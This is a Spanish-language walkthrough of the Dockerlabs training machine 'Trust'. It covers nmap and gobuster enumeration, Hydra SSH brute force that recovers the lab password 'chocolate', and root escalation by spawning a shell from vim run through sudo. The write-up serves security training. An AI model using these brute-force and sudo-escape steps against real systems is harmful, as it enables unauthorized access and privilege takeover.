# Trust - Dockerlabs (Muy Fácil)

## Introducción

Máquina de [Dockerlabs](https://dockerlabs.es/) centrada en enumeración web, fuerza bruta SSH con Hydra y escalada de privilegios abusando de sudoers.

- **Dificultad:** Muy Fácil
- **IP objetivo:** 172.17.0.2

## Reconocimiento

### Descubrimiento de host (red Docker)

```
sudo arp-scan -I docker0 --localnet --resolve
```

### Escaneo de puertos

```
nmap -p- -sV -sC --open -sS -vvv -n -Pn --min-rate 5000 172.17.0.2
```

Resultado relevante:

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    PHP cli server 5.5 or later
```

Nmap detecta que el servicio web es en realidad el servidor de desarrollo integrado de PHP, no un Apache real, aunque el título de la página muestre "Apache2 Debian Default Page". Esto sugiere una aplicación PHP corriendo detrás de una página por defecto, y orienta la enumeración hacia archivos .php.

## Enumeración web

### Wildcard response

Al lanzar gobuster, se detecta que el servidor responde con código 200 incluso para rutas inexistentes:

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
```

Gobuster reporta un falso positivo de longitud fija (10701 bytes) para cualquier URL inventada. Se excluye ese tamaño de respuesta:

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js --exclude-length 10701
```

Resultado:
```
secret.php  (Status: 200) [Size: 927]
```

### Contenido de secret.php

```
curl http://172.17.0.2/secret.php
```

Resultado: página con el mensaje "Hola Mario, esta web no se puede hackear", revelando el nombre mario como candidato de usuario del sistema.

## Obtención de credenciales

```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Resultado:
```
login: mario   password: chocolate
```

## Acceso inicial

```
ssh mario@172.17.0.2
```
Contraseña: chocolate

## Escalada de privilegios

```
sudo -l
```

Resultado:
```
User mario may run the following commands on 6a2c20c2dd7c:
    (ALL) /usr/bin/vim
```

A diferencia de otras máquinas resueltas anteriormente (donde el permiso incluía NOPASSWD), aquí sudo sí solicita contraseña en general, aunque el propio comando sudo -l ya la había cacheado temporalmente por la política por defecto de sudo (unos minutos de validez tras la última autenticación exitosa).

Escalada aprovechando la capacidad de vim de ejecutar comandos del sistema:

```
sudo /usr/bin/vim
:!/bin/bash
```

El proceso bash hereda los privilegios de root del proceso padre (vim).

```
whoami
```
Resultado: root

## Conclusión

Máquina con un vector de enumeración web algo más elaborado que las anteriores: detección y manejo de una respuesta wildcard en el fuzzing de directorios, y una pista narrativa (el nombre de un usuario) camuflada en una página que aparenta burlarse del atacante. El resto de la cadena repite un patrón ya visto: fuerza bruta dirigida contra SSH y escalada de privilegios explotando un permiso de sudo sobre un editor de texto. Buen ejercicio para reforzar:
- Reconocimiento de servidores de desarrollo (PHP built-in server) camuflados detrás de páginas por defecto
- Manejo de respuestas wildcard en gobuster con --exclude-length
- Comportamiento del cache temporal de autenticación de sudo
